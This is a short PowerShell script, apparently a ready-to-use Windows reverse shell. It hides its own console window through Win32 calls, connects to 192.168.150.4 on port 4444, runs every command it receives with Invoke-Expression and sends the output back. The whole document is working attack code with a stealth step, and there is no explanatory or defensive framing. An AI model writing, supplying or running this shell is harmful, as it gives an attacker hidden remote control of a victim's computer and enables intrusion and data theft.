$ip = "192.168.150.4"
$port = 4444

# Import API functions
Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
"@ -Namespace Win32Functions -Name NativeMethods

# Get console window handle and hide it
$consoleWindow = [Win32Functions.NativeMethods]::GetConsoleWindow()
[Win32Functions.NativeMethods]::ShowWindowAsync($consoleWindow, 0) # SW_HIDE = 0

# Your reverse shell code
$client = New-Object System.Net.Sockets.TCPClient($ip,$port)
$stream = $client.GetStream()
$networkBuffer = New-Object Byte[] 65536
while(($data = $stream.Read($networkBuffer, 0, $networkBuffer.Length)) -gt 0) {
    $output = [System.Text.Encoding]::ASCII.GetString($networkBuffer,0, $data)
    $cmdOutput = Invoke-Expression $output 2>&1 | Out-String
    $response = ([text.encoding]::ASCII).GetBytes($cmdOutput)
    $stream.Write($response,0,$response.Length)
    $stream.Flush()
}
$client.Close()